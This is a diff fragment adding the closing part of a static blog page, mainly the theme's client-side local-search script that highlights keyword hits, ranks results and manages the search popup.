+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
